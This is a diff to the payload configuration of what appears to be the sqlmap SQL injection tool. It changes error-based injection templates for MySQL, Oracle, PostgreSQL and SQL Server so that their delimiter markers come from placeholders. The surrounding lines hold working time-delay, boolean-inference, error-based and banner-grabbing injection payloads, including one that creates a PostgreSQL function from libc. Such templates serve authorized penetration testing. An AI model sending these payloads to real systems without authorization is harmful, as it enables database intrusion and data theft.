@@ -24,7 +24,7 @@
         <timedelay query="SELECT SLEEP(%d)" query2="SELECT BENCHMARK(5000000, MD5('%d'))"/>
         <substring query="MID((%s), %d, %d)"/>
         <case query="SELECT (CASE WHEN (%s) THEN 1 ELSE 0 END)"/>
-        <error query="%s (SELECT %s FROM(SELECT COUNT(*),CONCAT(CHAR(58),CHAR(115),CHAR(58),(%s),CHAR(58),CHAR(101),CHAR(58),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)"/>
+        <error query="%s (SELECT %s FROM(SELECT COUNT(*),CONCAT(%s,(%s),%s,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)"/>
         <inference query="AND ORD(MID((%s), %d, 1)) > %d"/>
         <banner query="SELECT VERSION()"/>
         <current_user query="SELECT CURRENT_USER()"/>
@@ -91,7 +91,7 @@
         <timedelay query="BEGIN DBMS_LOCK.SLEEP(%d); END" query2="EXEC DBMS_LOCK.SLEEP(%d.00)" query3="EXEC USER_LOCK.SLEEP(%d00)"/>
         <substring query="SUBSTR((%s), %d, %d)"/>
         <case query="SELECT (CASE WHEN (%s) THEN 1 ELSE 0 END) FROM DUAL"/>
-        <error query="%s %s=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(115)||CHR(58)||(REPLACE((%s),CHR(32),CHR(58)||CHR(95)||CHR(58)))||CHR(58)||CHR(101)||CHR(58)||CHR(62))) FROM DUAL)"/>
+        <error query="%s %s=(SELECT UPPER(XMLType(CHR(60)||%s||(REPLACE((%s),CHR(32),CHR(58)||CHR(95)||CHR(58)))||%s||CHR(62))) FROM DUAL)"/>
         <inference query="AND ASCII(SUBSTR((%s), %d, 1)) > %d"/>
         <banner query="SELECT banner FROM v$version WHERE ROWNUM=1"/>
         <current_user query="SELECT USER FROM DUAL"/>
@@ -175,7 +175,7 @@
         <timedelay query="SELECT PG_SLEEP(%d)" query2="SELECT 'sqlmap' WHERE exists(SELECT * FROM generate_series(1, 300000%d))" query3="CREATE OR REPLACE FUNCTION sleep(int) RETURNS int AS '/lib/libc.so.6', 'sleep' language 'C' STRICT; SELECT sleep(%d)"/>
         <substring query="SUBSTR((%s)::text, %d, %d)"/>
         <case query="SELECT (CASE WHEN (%s) THEN 1 ELSE 0 END)"/>
-        <error query="%s %s=CAST(CHR(58)||CHR(115)||CHR(58)||(%s)::text||CHR(58)||CHR(101)||CHR(58) AS NUMERIC)"/>
+        <error query="%s %s=CAST(%s||(%s)::text||%s AS NUMERIC)"/>
         <inference query="AND ASCII(SUBSTR((%s)::text, %d, 1)) > %d"/>
         <banner query="SELECT VERSION()"/>
         <current_user query="SELECT CURRENT_USER"/>
@@ -242,7 +242,7 @@
         <timedelay query="WAITFOR DELAY '0:0:%d'"/>
         <substring query="SUBSTRING((%s), %d, %d)"/>
         <case query="SELECT (CASE WHEN (%s) THEN '1' ELSE '0' END)"/>
-        <error query="%s %s=CONVERT(INT,(CHAR(58)+CHAR(115)+CHAR(58)+(%s)+CHAR(58)+CHAR(101)+CHAR(58)))"/>
+        <error query="%s %s=CONVERT(INT,(%s+(%s)+%s))"/>
         <inference query="AND ASCII(SUBSTRING((%s), %d, 1)) > %d"/>
         <banner query="SELECT @@VERSION"/>
         <current_user query="SELECT SYSTEM_USER"/>
